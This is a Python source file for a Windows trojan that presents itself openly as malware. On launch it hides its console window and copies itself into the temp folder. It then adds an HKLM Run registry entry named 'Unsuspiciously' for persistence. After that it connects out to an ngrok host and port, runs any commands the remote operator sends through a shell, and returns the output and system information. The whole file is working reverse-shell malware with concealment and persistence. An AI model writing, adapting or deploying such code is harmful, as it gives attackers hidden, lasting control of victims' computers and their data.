#!/usr/bin/env python3
import threading
import socket
import subprocess
from time import sleep
from tempfile import gettempdir
from os.path import basename, join, abspath
from os import devnull, chdir
import sys
from shutil import copy2
import payloads
import ctypes

class Trojan:
    def __init__(self, target="0.tcp.sa.ngrok.io", port=12744):
        self.target = target  # your ngrok ip here
        self.port = port
        self.targetAddress = (self.target, self.port)
        self.trojan = None
        self.FILENAME = self.getFileName()
        self.TEMPDIR = gettempdir()
        self.KEYVALUE = "Unsuspiciously" #Value of key in Windows Registry


    def verifyPath(self):
        # Get the absolute path of the script file being executed
        script_path = abspath(sys.argv[0])

        # Check if the script is being executed from the TEMPDIR
        if script_path.startswith(abspath(self.TEMPDIR)):
            return False
        else:
            return True

    def hideWindow(self):
        consoleWindowHandle = ctypes.windll.kernel32.GetConsoleWindow()  
        ctypes.windll.user32.ShowWindow(consoleWindowHandle, 0)  #(SW_HIDE = 0)


    def getFileName(self):
        if getattr(sys, 'frozen', False):
            fileName = basename(sys.executable)
        else:
            fileName = basename(__file__)
        return fileName

    def addRegistryEntry(self):  # Requires administrative privileges.
        try:
            command = (
                "REG ADD HKEY_LOCAL_MACHINE\\"
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
                f" /v {self.KEYVALUE} /d " + self.TEMPDIR + "\\" + self.FILENAME +
                " /f"
            )
            subprocess.Popen(command, shell=True)
        except Exception as e:
            print(f"Error while adding the entry to the registry: {e}")

    def selfCopyTrojan(self):
        try:
            destino = join(self.TEMPDIR, self.FILENAME)
            copy2(__file__, destino)
        except Exception as e:
            print(f"Error while copying the file: {e}")

    def startTrojan(self):
        while True:
            try:
                self.trojan = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.trojan.connect(self.targetAddress)
                msg = '\nConnection received from victim\n'
                self.trojan.send(msg.encode('utf-8'))
                self.handleConnection(self.trojan)
            except socket.error as e:
                print(f"Error: {e}")
            finally:
                self.stopServer()
                sleep(60)


    def verifyCommand(self, cmd):
        cmd = cmd.lower()
        if cmd == "/info":
            result = payloads.getSystemInfo()
            return result
        else:
            result = self.executeCommand(cmd)
            return result

    def handleConnection(self, s):
        try:
            while True:
                received = s.recv(1024)
                if not received:
                    break
                command = received.decode('utf-8').strip()
                result = self.verifyCommand(command)                    
                s.sendall(result.encode('utf-8'))
        except Exception as e:
            print(f"Error handling connection: {e}")

    def executeCommand(self, command):
        try:
            # Check if the command is 'cd ..'
            if command.strip() == 'cd ..':
                # Change the working directory one level up
                chdir('..')

            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            output, error = process.communicate()
            if error:
                return f"Erro: {error}"
            return output
        except subprocess.CalledProcessError as e:
            return str(e)

    def stopServer(self):
        if self.trojan:
            self.trojan.close()
        self.startTrojan()


if (__name__ == "__main__"):
    trojan = Trojan()
    trojan.hideWindow()
    # Check if the file is being executed from the %TEMP% folder
    if trojan.verifyPath():
        trojan.addRegistryEntry()
        trojan.selfCopyTrojan()
    trojan.startTrojan()
